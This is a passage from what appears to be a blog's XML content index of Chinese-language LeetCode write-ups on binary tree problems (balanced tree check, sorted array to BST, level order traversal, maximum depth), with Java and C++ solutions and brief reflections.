<p>DFS解决，上面的取深度的方法思路虽然是从底部向上求的每一个节点的深度，但是，真正的判断是从root节点开始向下进行的。<br><br>优化的话，尽可能地在递归到二叉树的底部时添加判断操作。<br>判断当前节点构成的子树是否平衡：<br>&nbsp;&nbsp;&nbsp;&nbsp;1. 当前节点左右比较，高度差大于1，则不是平衡树。<br>&nbsp;&nbsp;&nbsp;&nbsp;2. 如果左子树不是平衡树，则当前节点构成的也一定不是平衡树，右子树也是如此。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BalancedBinaryTree3</span></span>&#123;</span><br><span class="line">    <span class="comment">/*Optimized!*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isBalancedHelp(root)!=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">isBalancedHelp</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = isBalancedHelp(node.left);</span><br><span class="line">        <span class="keyword">if</span>(left==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> right = isBalancedHelp(node.right);</span><br><span class="line">        <span class="keyword">if</span>(right==-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.abs(left-right)&lt;=<span class="number">1</span>?Math.max(left,right)+<span class="number">1</span>:-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里面有一点技巧要注意，判断完左子树后，应该立马对左子树的返回值进行判断，因为，如果左右子树只要有一个不是平衡二叉树，则无需进行，直接向上层返回。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这种题目，如果不考虑优化，是很好解决的，遍历所有的节点并对所有节点构成的子树进行平衡判断，但是，时间复杂度太高了。<br>优化，只要某节点的左右子树中存在非平衡的树，那么上层则无需在判断，直接向上返回即可。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>Optimize(优化)</tag>
        <tag>AVL树(平衡二叉树)</tag>
      </tags>
  </entry>
  <entry>
    <title>108. Convert Sorted Array to Binary Search Tree</title>
    <url>/2017/05/10/108-Convert-Sorted-Array-to-Binary-Search-Tree/</url>
    <content><![CDATA[<p>Given an array where elements are sorted in ascending order, convert it to a height balanced BST.</p>
<p>Subscribe to see which companies asked this question</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>递归+二分法</strong></p>
<blockquote>
<p>这道题的思路主要是二分法，由于是一个BST，所以应该满足：节点的左节点小于根节点，右节点大于根节点。<br><br>所以这道题使用二分法来递归的把每一个节点放到BST中。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConvertSortedArraytoBinarySearchTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> sortedArrayToBST(nums,low,high);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">        TreeNode node = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(low&lt;=high)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = low + (high-low)/<span class="number">2</span>;</span><br><span class="line">             node = <span class="keyword">new</span> TreeNode(nums[mid]);</span><br><span class="line">             <span class="keyword">if</span>(low&lt;=mid-<span class="number">1</span>)&#123;</span><br><span class="line">                 node.left = sortedArrayToBST(nums,low,mid-<span class="number">1</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(high&gt;=mid+<span class="number">1</span>)&#123;</span><br><span class="line">                 node.right = sortedArrayToBST(nums,mid+<span class="number">1</span>,high);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Boundary-Check-边界检测"><a href="#Boundary-Check-边界检测" class="headerlink" title="Boundary Check(边界检测)"></a>Boundary Check(边界检测)</h2><blockquote>
<p>二分法的边界检测有点糊涂，没有摸清，这里应该注意。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>非递归解法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConvertSortedArraytoBinarySearchTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( nums.length == <span class="number">0</span> ) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode head = <span class="keyword">new</span> TreeNode(<span class="number">0</span>);</span><br><span class="line">        Queue&lt;TreeNode&gt; queue_node = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        Queue&lt;Integer&gt; queue_low = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        Queue&lt;Integer&gt; queue_high = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        queue_node.add(head);</span><br><span class="line">        queue_low.add(<span class="number">0</span>);</span><br><span class="line">        queue_high.add(nums.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!queue_node.isEmpty())&#123;</span><br><span class="line">            TreeNode node = queue_node.poll();</span><br><span class="line">            <span class="keyword">int</span> low = queue_low.poll();</span><br><span class="line">            <span class="keyword">int</span> high = queue_high.poll();</span><br><span class="line">            <span class="keyword">int</span> mid = low + (high-low)/<span class="number">2</span>;</span><br><span class="line">            node.val = nums[mid];</span><br><span class="line">            <span class="keyword">if</span>(low&lt;=mid-<span class="number">1</span>)&#123;</span><br><span class="line">                node.left = <span class="keyword">new</span> TreeNode(<span class="number">0</span>);</span><br><span class="line">                queue_node.add(node.left);</span><br><span class="line">                queue_low.add(low);</span><br><span class="line">                queue_high.add(mid-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(high&gt;=mid+<span class="number">1</span>)&#123;</span><br><span class="line">                node.right = <span class="keyword">new</span> TreeNode(<span class="number">0</span>);</span><br><span class="line">                queue_node.add(node.right);</span><br><span class="line">                queue_low.add(mid+<span class="number">1</span>);</span><br><span class="line">                queue_high.add(high);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>还是DFS+递归和BFD+Queue的解题思路。二叉树的问题万变不离其宗。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>二分法</tag>
        <tag>Boundary Check(边界值检测)</tag>
      </tags>
  </entry>
  <entry>
    <title>107. Binary Tree Level Order Traversal II</title>
    <url>/2017/05/08/107-Binary-Tree-Level-Order-Traversal-II/</url>
    <content><![CDATA[<p>Given a binary tree, return the bottom-up level order traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root).</p>
<p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="number">3</span></span><br><span class="line"> / \</span><br><span class="line"><span class="number">9</span>  <span class="number">20</span></span><br><span class="line">  /  \</span><br><span class="line"> <span class="number">15</span>   <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>return its bottom-up level order traversal as:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [<span class="number">15</span>,<span class="number">7</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">20</span>],</span><br><span class="line">  [<span class="number">3</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>Using BFS</strong></p>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/binary-tree-level-order-traversal-ii/</span></span><br><span class="line"><span class="comment"> * Runtime: 4 ms Beats : 93.18%</span></span><br><span class="line"><span class="comment"> * Memory: 12.6 MB Beats: 88.08%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; levelOrderBottom(TreeNode* root) &#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">		<span class="keyword">if</span> (root == <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">queue</span>&lt;TreeNode*&gt; q;</span><br><span class="line">		q.push(root);</span><br><span class="line">		<span class="keyword">while</span> (!q.empty())&#123;</span><br><span class="line">			<span class="keyword">int</span> length = q.size();</span><br><span class="line">			<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; level;</span><br><span class="line">			<span class="keyword">while</span> (length--)&#123;</span><br><span class="line">				TreeNode* t = q.front();</span><br><span class="line">				q.pop();</span><br><span class="line">				level.push_back(t-&gt;val);</span><br><span class="line">				<span class="keyword">if</span> (t-&gt;left != <span class="literal">NULL</span>)&#123;</span><br><span class="line">					q.push(t-&gt;left);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (t-&gt;right != <span class="literal">NULL</span>)&#123;</span><br><span class="line">					q.push(t-&gt;right);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			result.push_back(level);</span><br><span class="line">		&#125;</span><br><span class="line">		reverse(result.begin(), result.end());</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/binary-tree-level-order-traversal-ii/</span></span><br><span class="line"><span class="comment"> * Beats : 83.47%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversalII2</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using BFS</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> length = queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(queue.peek().left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(queue.peek().left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(queue.peek().right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(queue.peek().right);</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(queue.poll().val);</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(<span class="number">0</span>,list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p>一开始有点蒙，因为我一直在想，除了相同的思路，然后在添加的时候反向添加，难道还有什么神奇的方法？</p>
<p><strong>思路相同：</strong> <a href="/2017/05/08/102-Binary-Tree-Level-Order-Traversal/" title="102. Binary Tree Level Order Traversal">102. Binary Tree Level Order Traversal</a></p>
<p>这题应该自信一点，相同的思路，反向添加，切记自信！</p>
<p><strong>DFS</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/binary-tree-level-order-traversal-ii/</span></span><br><span class="line"><span class="comment"> * Beats : 87.41%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversalII</span></span>&#123;</span><br><span class="line">    <span class="comment">//Using DFS</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        levelOrderBottomHelp(res,root,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrderBottomHelp</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; res, TreeNode node, <span class="keyword">int</span> level)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(res.size()&lt;level)&#123;</span><br><span class="line">            res.add(<span class="number">0</span>,<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        res.get(res.size()-level).add(node.val);</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderBottomHelp(res,node.left,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderBottomHelp(res,node.right,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>## </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种题目一定要自信的先把能想到的最好的方法做出来，然后再考虑是否还有另类的解法，关键是一定要自信！</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Tree(树)</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>104. Maximum Depth of Binary Tree</title>
    <url>/2017/05/08/104-Maximum-Depth-of-Binary-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, find its maximum depth.</p>
<p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p>
<p><strong>Note:</strong> A leaf is a node with no children.</p>
<p><strong>Example:</strong></p>
<p>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="number">3</span></span><br><span class="line"> / \</span><br><span class="line"><span class="number">9</span>  <span class="number">20</span></span><br><span class="line">  /  \</span><br><span class="line"> <span class="number">15</span>   <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>return its depth = 3.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>采用递归的思路解决。</p>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/maximum-depth-of-binary-tree/</span></span><br><span class="line"><span class="comment"> * Beats : 83.16%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> left = maxDepth(root-&gt;left);</span><br><span class="line">		<span class="keyword">int</span> right = maxDepth(root-&gt;right);</span><br><span class="line">		<span class="keyword">return</span> left &gt; right ? left + <span class="number">1</span> : right + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/maximum-depth-of-binary-tree/</span></span><br><span class="line"><span class="comment"> * Beats : 40%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaximumDepthofBinaryTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(maxDepth(root.left),maxDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一道二叉树的问题，万变不离其宗，BFS，Stack，DFS，Queue，递归思路不能忘记！</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Tree(树)</tag>
        <tag>recursion(递归)</tag>
      </tags>
  </entry>
  <entry>
    <title>102. Binary Tree Level Order Traversal</title>
    <url>/2017/05/08/102-Binary-Tree-Level-Order-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level).</p>
<p><strong>For example:</strong></p>
<p>Given binary tree <code>[3,9,20,null,null,15,7]</code></p>
<pre><code>  3
 / \
9  20
  /  \
 15   7
</code></pre><p>return its level order traversal as:</p>
<pre><code>[
  [3],
  [9,20],
  [15,7]
]
</code></pre><a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p>我觉得第一想法很重要，因为第一思路体现了你所学的和所知道的东西。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversal</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;List&lt;Integer&gt;&gt; reslist = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        reslist = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> reslist;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;TreeNode&gt; nodeList = <span class="keyword">new</span> ArrayList&lt;TreeNode&gt;();</span><br><span class="line">        List&lt;Integer&gt; levelList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        nodeList.add(root);</span><br><span class="line">        levelList.add(root.val);</span><br><span class="line">        reslist.add(levelList);</span><br><span class="line">        levelOrderHelp(nodeList);</span><br><span class="line">        <span class="keyword">return</span> reslist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrderHelp</span><span class="params">(List&lt;TreeNode&gt; list)</span></span>&#123;</span><br><span class="line">        List&lt;Integer&gt; levelList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        List&lt;TreeNode&gt; nodeList = <span class="keyword">new</span> ArrayList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">for</span>(TreeNode node:list)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                nodeList.add(node.left);</span><br><span class="line">                levelList.add(node.left.val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                nodeList.add(node.right);</span><br><span class="line">                levelList.add(node.right.val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nodeList.size()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        reslist.add(levelList);</span><br><span class="line">        levelOrderHelp(nodeList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这解法是我第一想法，在最短的时间内我所得到的AC思路。应该值得去优化下，我第一想法，想到了利用递归；但是有很多地方是做的很冗余的，对于遍历二叉树和存储二叉树节点的值，我使用了两个数组。</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>DFS思路</strong></p>
<p>减少数组的使用，使用DFS深度优先遍历+递归</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using DFS recursion !</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; reslist = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> reslist;</span><br><span class="line">        &#125;</span><br><span class="line">        levelOrderHelp(reslist,root,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> reslist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrderHelp</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; reslist, TreeNode node, <span class="keyword">int</span> level)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(reslist.size()&lt;level)&#123;</span><br><span class="line">            reslist.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        reslist.get(level-<span class="number">1</span>).add(node.val);</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderHelp(reslist,node.left,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            levelOrderHelp(reslist,node.right,level+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用DFS的思路，对于二叉树上的每一个节点，根据传进去的level参数，在数组中找到它的定位并添加。</p>
</blockquote>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>BFS思路</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeLevelOrderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using BFS</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; reslist = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> reslist;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> length = queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">                TreeNode node = queue.poll();</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            reslist.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reslist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>主要思路是利用Queus队列这一数据结构，来实现BFS遍历。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题很不错，总结了前面的二叉树的各种使用方法，最后灵活的解决了问题。注意使用递归和Queue和Stack这几种数据机构和方法，这些是解决二叉树问题的基本手段。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Queue(队列)</tag>
        <tag>BFS(广度优先遍历)</tag>
        <tag>DFS(深度优先遍历)</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>101. Symmetric Tree</title>
    <url>/2017/05/04/101-Symmetric-Tree/</url>
